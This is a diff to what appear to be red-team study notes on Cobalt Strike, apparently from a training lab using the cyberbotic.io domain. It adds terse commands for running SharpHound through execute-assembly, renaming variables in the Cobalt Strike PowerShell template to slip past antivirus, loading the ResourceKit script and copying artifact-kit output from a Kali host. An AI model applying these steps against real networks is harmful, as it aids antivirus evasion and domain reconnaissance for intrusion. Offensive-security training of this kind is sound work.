@@ -201,3 +201,31 @@ Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templat
 Modifying the detected lines one can generate a template that won't be caught.
 
 Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.
+
+
+
+
+
+
+
+```bash
+cd C:\Tools\neo4j\bin
+neo4j.bat console
+http://localhost:7474/ --> Change password
+execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d cyberbotic.io
+
+
+
+# Change powershell
+C:\Tools\cobaltstrike\ResourceKit
+template.x64.ps1
+# Change $var_code -> $polop
+# $x --> $ar
+cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna
+
+#artifact kit
+cd  C:\Tools\cobaltstrike\ArtifactKit
+pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
+
+
+```
